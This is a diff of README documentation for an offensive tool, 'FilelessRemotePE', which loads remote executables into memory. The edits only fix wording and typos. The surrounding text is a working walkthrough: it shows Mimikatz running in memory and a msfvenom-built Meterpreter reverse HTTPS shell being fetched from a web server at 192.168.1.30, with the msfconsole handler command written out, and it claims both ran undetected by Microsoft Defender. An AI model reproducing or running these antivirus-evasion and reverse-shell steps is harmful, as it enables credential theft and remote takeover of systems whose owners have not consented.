@@ -596,7 +596,7 @@ The tool "FilelessRemotePE" allows to load directly into memory remote Portable 
 
 Limitation: It runs only c/c++/asm based binaries.
 
-Test/PoC 1 - Download and execution in-memory of Mimikatz.exe on a Windows server 2016 without being detected nor blocked by the MS Defender AV (enabled and up-to-date)
+Test/PoC 1 - Download and execute (in-memory) Mimikatz.exe on a Windows server 2016 without being detected nor blocked by the MS Defender AV (enabled and up-to-date)
 -------------------------------------------------------------------------------------------------------------------------------------------------------------------------
 
 C:\Users\Administrator>powershell -exec bypass
@@ -679,7 +679,7 @@ mimikatz # exit
 Bye!
 
 
-Test/PoC 2 - Download and execution in-memory of a x64 Meterpreter reverse https shell on a Windows 10 without being detected nor blocked by the MS Defender AV (enabled and up-to-date)
+Test/PoC 2 - Download and execute (in-memory) a x64 Meterpreter reverse https shell on a Windows 10 without being detected nor blocked by the MS Defender AV (enabled and up-to-date)
 -------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
 
 => Step 1 - Generate a (x64) Meterpreter reverse https shell with msfvenom and host it on a web server
@@ -691,10 +691,10 @@ Payload size: 201308 bytes
 Final size of exe file: 207872 bytes
 Saved as: meterpreter-x64-reverse-https.exe
 
-jeff@kali:~/Documents/Tools/Pivoting-with-MSF$  python3 -m http.server 8080
+jeff@kali:~/Documents/Tools/Pivoting-with-MSF$ python3 -m http.server 8080
 
 
-=> Step 2 - Load directly into memory the (x64) Meterpreter reverse https shell using the tool "FilelessRemotePE" on a target Windows 10
+=> Step 2 - Load directly into memory the (x64) Meterpreter reverse https shell using the tool "FilelessRemotePE" on the target Windows 10
 -----------------------------------------------------------------------------------------------------------------------------------------
 Microsoft Windows [Version 10.0.19044.2364]
 (c) Microsoft Corporation. All rights reserved.
@@ -713,8 +713,8 @@ http://192.168.1.30:8080/Pivoting-with-MSF/meterpreter-x64-reverse-https.exe
 [+] Run PE
 
 
-=> Step 3 - You have now a meterprter shell running without being detected nor blocked by the MS Defender AV
--------------------------------------------------------------------------------------------------------------
+=> Step 3 - You have now a meterpreter shell running without being detected nor blocked by the MS Defender AV
+--------------------------------------------------------------------------------------------------------------
 jeff@kali:~$ sudo msfconsole -x "use exploit/multi/handler; set PAYLOAD windows/x64/meterpreter_reverse_https; set LHOST 192.168.1.30; set LPORT 443; set EXITFUNC thread; set ExitOnSession false; set SessionCommunicationTimeout 0; set EnableUnicodeEncoding true; set HandlerSSLCert /home/jeff/Documents/Tools/Pivoting-with-MSF/pentest.pem;  run -j"
 [sudo] password for jeff: 
 [!] The following modules were loaded with warnings:
@@ -773,20 +773,18 @@ Channel 1 created.
 Microsoft Windows [Version 10.0.19044.2364]
 (c) Microsoft Corporation. All rights reserved.
 
-C:\Users\Administrator.PO718687\Documents\Tools-AD>powershell -exec bypass
+C:\Users\Administrator\Documents\Tools-AD>powershell -exec bypass
 powershell -exec bypass
 Windows PowerShell
 Copyright (C) Microsoft Corporation. All rights reserved.
-Try the new cross-platform PowerShell https://aka.ms/pscore6
 
-PS C:\Users\Administrator.PO718687\Documents\Tools-AD> Get-MpComputerStatus | Select RealTimeProtectionEnabled, IoavProtectionEnabled,AntispywareEnabled | FL
-Get-MpComputerStatus | Select RealTimeProtectionEnabled, IoavProtectionEnabled,AntispywareEnabled | FL
+PS C:\Users\Administrator\Documents\Tools-AD> Get-MpComputerStatus | Select RealTimeProtectionEnabled, IoavProtectionEnabled,AntispywareEnabled | FL
 
 RealTimeProtectionEnabled : True
 IoavProtectionEnabled     : True
 AntispywareEnabled        : True
 
-PS C:\Users\Administrator.PO718687\Documents\Tools-AD> 
+PS C:\Users\Administrator\Documents\Tools-AD> 
 
 <SNIP>
 
